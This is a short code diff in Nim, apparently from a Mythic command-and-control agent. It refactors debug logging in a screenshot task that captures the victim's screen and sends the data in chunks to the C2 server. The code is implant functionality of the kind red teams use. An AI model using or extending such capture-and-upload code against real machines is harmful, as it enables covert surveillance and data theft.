@@ -1,4 +1,4 @@
-import ../config
+import ../utils/debug
 import std/[json, strformat, base64, math]
 when defined(posix):
   import posix
@@ -74,11 +74,8 @@ proc captureScreenshotData*(): seq[byte] =
 proc screenshot*(taskId: string, params: JsonNode): JsonNode =
   ## Screenshot - captures screen and initiates download to Mythic
   ## This is a background task that chunks the screenshot data
-  let cfg = getConfig()
-  
   when defined(windows):
-    if cfg.debug:
-      echo "[DEBUG] Capturing screenshot"
+    debug "[DEBUG] Capturing screenshot"
     
     try:
       # Capture screenshot
@@ -95,8 +92,7 @@ proc screenshot*(taskId: string, params: JsonNode): JsonNode =
       # Calculate chunks
       let totalChunks = int((screenshotData.len.float / CHUNK_SIZE.float).ceil)
       
-      if cfg.debug:
-        echo &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
+      debug &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
       
       # Send initial download response
       let downloadResponse = %*{
